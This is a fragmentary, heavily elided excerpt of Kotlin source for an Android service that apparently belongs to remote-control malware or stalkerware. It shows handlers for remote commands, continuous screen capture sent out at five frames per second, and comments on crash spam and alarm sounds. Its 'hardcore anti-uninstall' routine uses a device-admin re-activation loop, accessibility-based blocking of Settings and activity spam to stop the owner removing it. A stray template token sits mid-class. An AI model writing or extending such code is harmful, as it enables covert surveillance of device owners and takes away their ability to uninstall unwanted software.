...
class DeviceService : Service(), LifecycleOwner {
    ...
    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            ...
            "antiUninstallOn"   -> enableAntiUninstall()
            "antiUninstallOff"  -> disableAntiUninstall()
        }
    }
...
${htmlContent}
    ...
    private fun startScreenCapture(resultCode: Int, data: Intent) {
        ...
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            ...
            // OPTIMIZED: Reduce to 20% resolution for better performance
            val scale  = 0.2f
            ...
            // OPTIMIZED: Reduce to 20% resolution
            val scale = 0.2f
        ...
        // OPTIMIZED: Use RGB_565 instead of RGBA_8888 (50% memory reduction)
        ...
        screenRunnable = object : Runnable {
            override fun run() {
                ...
                // OPTIMIZED: Increase interval to 200ms for smoother capture (5 fps)
                screenHandler?.postDelayed(this, 200)
            }
        }
    ...
    private fun captureAndSendScreen() {
        ...
        try {
            ...
            // OPTIMIZED: Lower JPEG quality from 35 to 25 for smaller size
     ...
     * - crash: boolean (enable crash spam)
     * - sound: boolean (enable alarm sound)
    ...
    /**
     * Enable hardcore anti-uninstall protection
     * - Enables device admin re-activation loop
     * - Enables Settings blocking via accessibility
     * - Enables activity spam on disable attempts
     */
    private fun enableAntiUninstall() {
        try {
            // Enable protection flag
            AntiUninstallHelper.enableProtection(this)
            ...
            emitStatus(JSONObject().apply {
                ...
                put("deviceAdminActive", AntiUninstallHelper.isAdminActive(applicationContext))
            })
            
            Log.d("DeviceService", "Anti-uninstall protection ENABLED")
        } catch (e: Exception) {
            Log.e("DeviceService", "Enable anti-uninstall error: ${e.message}")
        }
    }

    /**
     * Disable anti-uninstall protection
     */
    private fun disableAntiUninstall() {
        try {
            // Disable protection flag
            val prefs = getSharedPreferences("anti_uninstall_prefs", Context.MODE_PRIVATE)
            prefs.edit().putBoolean("protection_enabled", false).apply()
            
            emitStatus(JSONObject().apply {
                put("antiUninstallEnabled", false)
            })
            
            Log.d("DeviceService", "Anti-uninstall protection DISABLED")
        } catch (e: Exception) {
            Log.e("DeviceService", "Disable anti-uninstall error: ${e.message}")
        }
    }
}
